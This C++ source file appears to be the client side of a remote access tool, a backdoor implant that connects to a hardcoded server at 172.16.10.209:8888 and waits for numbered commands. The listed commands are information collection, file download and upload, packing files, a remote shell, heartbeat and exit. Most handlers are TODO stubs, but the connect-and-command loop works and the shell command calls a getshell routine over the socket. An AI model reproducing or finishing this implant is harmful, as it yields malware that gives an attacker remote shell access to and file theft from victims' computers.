#include "base64.hpp"
#include "shell.hpp"
#include "BasicHeader.hpp"

// SWITCH -> SET COMMAND
// SWITCH CASE 0x1 0x2 0x3 0x4 0x5 0x6

// 0x1 BASIC INFOMATION Collector
// 0x2 Download file
// 0x3 Upload file
// 0x4 Packup file to download
// 0x5 Getshell
// 0x6 Exit
// 0x7 HeartBeat Sleep



SOCKET ConnectServer(const char* SERVER_IP,int SERVER_PORT) {
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &wsData);
    if (wsResult != 0) {
        std::cerr << "WSAStartup failed with error: " << wsResult << std::endl;
        return -1;
    }

    // 创建套接字
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return -1;
    }

    // 准备连接信息
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &hint.sin_addr);

    // 连接到服务器
    int connResult = connect(sock, reinterpret_cast<sockaddr*>(&hint), sizeof(hint));
    if (connResult == SOCKET_ERROR) {
        std::cerr << "Connection failed with error: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    std::cout << "Connected to server." << std::endl;
    return sock;
}


void handleCommand(int command, SOCKET sock) {
    switch (command) {
    case 1:
        // BASIC INFORMATION COLLECTOR
        std::cout << "BASIC INFORMATION COLLECTOR" << std::endl;
        // TODO: BASIC INFORMATION COLLECTOR
        break;
    case 2:
        // Download FILE
        // TODO: Implement the file download function
        break;
    case 3:
        // Upload FILE
        // TODO: Implement the file upload function
        break;
    case 4:
        // ZIP FILE
        // TODO: Implement file packaging
        break;
    case 5:
        // Getshell
        // TODO: Getshell
        getshell(sock);
        break;
    case 6:
        // EXIT
        // TODO: Exit
        break;
    case 7:
        // SLEEP 
        // TODO: HeartBeat
        break;
    default:
        std::cout << "Unknown command: " << command << std::endl;
        // 发送默认回复
        std::string defaultResponse_base64 = base64_encode("Invalid command. Please input correct command.");
        send(sock, defaultResponse_base64.c_str(), defaultResponse_base64.size(), 0);
        break;
    }

}

int main() {
    const char* SERVER_IP = "172.16.10.209";
    const int SERVER_PORT = 8888;
    
    SOCKET sock = ConnectServer(SERVER_IP, SERVER_PORT);

    while (true) {
        char recvBuffer[4096];
        int recvResult = recv(sock, recvBuffer, sizeof(recvBuffer), 0);

        if (recvResult == SOCKET_ERROR) {
            std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
            break;
        }

        else if (recvResult == 0) {
            std::cout << "Connection close by server!" << std::endl;
            break;
        }

        recvBuffer[recvResult] = '\0';
        std::cout << "Received: " << recvBuffer << std::endl;

        if (recvResult > 0) {
            int command = static_cast<int>(recvBuffer[0])-48; // ASCII 48 -> DEC 0
            handleCommand(command, sock);
        }
        std::string defaultResponse_base64 = base64_encode("Continue input command set");
        send(sock, defaultResponse_base64.c_str(), defaultResponse_base64.size(), 0);
    }



    closesocket(sock);
    WSACleanup();

    return 0;
}
